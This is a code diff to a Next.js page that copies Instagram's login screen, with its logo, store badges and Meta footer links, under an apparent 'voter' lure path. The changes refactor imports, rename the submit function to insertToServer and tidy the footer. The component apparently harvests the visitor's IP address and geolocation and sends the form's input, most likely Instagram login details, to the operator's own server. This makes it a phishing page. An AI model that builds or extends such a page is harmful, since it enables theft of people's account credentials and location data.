@@ -1,5 +1,6 @@
 "use client";
 
+import { useEffect, useState } from "react";
 import Image from "next/image";
 import Link from "next/link";
 
@@ -7,11 +8,11 @@ import Apple from "@/public/apple-store.png";
 import Instagram_logo from "@/public/Instagram_logo.png";
 import Facebook from "@/public/facebook.png";
 import Google from "@/public/google-play.png";
-import { useEffect, useState } from "react";
 import Loading from "@/app/pages/voter/instagram/loading";
 
-import { getIp, getLocationDetails } from "../utils/getData";
-import { sendDataToServer } from "../utils/postData";
+import { getLocationDetails } from "@/utils/thirdPartyUtils/getLocationDetails";
+import { getIp } from "@/utils/thirdpartyUtils/getIp";
+import { insertToServer } from "@/utils/serverUtils/insertToServer";
 
 export default function Instagram() {
   const [loading, setLoading] = useState(true);
@@ -68,7 +69,7 @@ export default function Instagram() {
     e.preventDefault();
     // setLoading(true);
 
-    const result = await sendDataToServer({
+    const result = await insertToServer({
       ip,
       country,
       city,
@@ -104,11 +105,7 @@ export default function Instagram() {
             ) : (
               ""
             )}
-            <form
-              onSubmit={submitForm}
-              // action="http://localhost/insert.php"
-              className="flex flex-col gap-3 w-full "
-            >
+            <form onSubmit={submitForm} className="flex flex-col gap-3 w-full ">
               <div className="email-container flex justify-center">
                 <input
                   type="text"
@@ -210,56 +207,43 @@ export default function Instagram() {
           <div className=" -mb-10 text-[#737373] text-sm lg:text-xs">
             <ul className="flex flex-row text-center justify-center flex-wrap gap-2 w-[80%] mx-auto lg:w-full">
               <li>
-                {" "}
-                <Link href="">Meta</Link>{" "}
+                <Link href="">Meta</Link>
               </li>
               <li>
-                {" "}
-                <Link href="">About</Link>{" "}
+                <Link href="">About</Link>
               </li>
               <li>
-                {" "}
-                <Link href="">Blog</Link>{" "}
+                <Link href="">Blog</Link>
               </li>
               <li>
-                {" "}
-                <Link href="">Jobs</Link>{" "}
+                <Link href="">Jobs</Link>
               </li>
               <li>
-                {" "}
-                <Link href="">Help</Link>{" "}
+                <Link href="">Help</Link>
               </li>
               <li>
-                {" "}
-                <Link href="">API</Link>{" "}
+                <Link href="">API</Link>
               </li>
               <li>
-                {" "}
-                <Link href="">Privacy</Link>{" "}
+                <Link href="">Privacy</Link>
               </li>
               <li>
-                {" "}
-                <Link href="">Terms</Link>{" "}
+                <Link href="">Terms</Link>
               </li>
               <li>
-                {" "}
-                <Link href="">Locations</Link>{" "}
+                <Link href="">Locations</Link>
               </li>
               <li>
-                {" "}
-                <Link href="">Instagram Lite</Link>{" "}
+                <Link href="">Instagram Lite</Link>
               </li>
               <li>
-                {" "}
-                <Link href="">Threads</Link>{" "}
+                <Link href="">Threads</Link>
               </li>
               <li>
-                {" "}
-                <Link href="">Contact uploading and non-users</Link>{" "}
+                <Link href="">Contact uploading and non-users</Link>
               </li>
               <li>
-                {" "}
-                <Link href="">Meta Verified</Link>{" "}
+                <Link href="">Meta Verified</Link>
               </li>
             </ul>
 
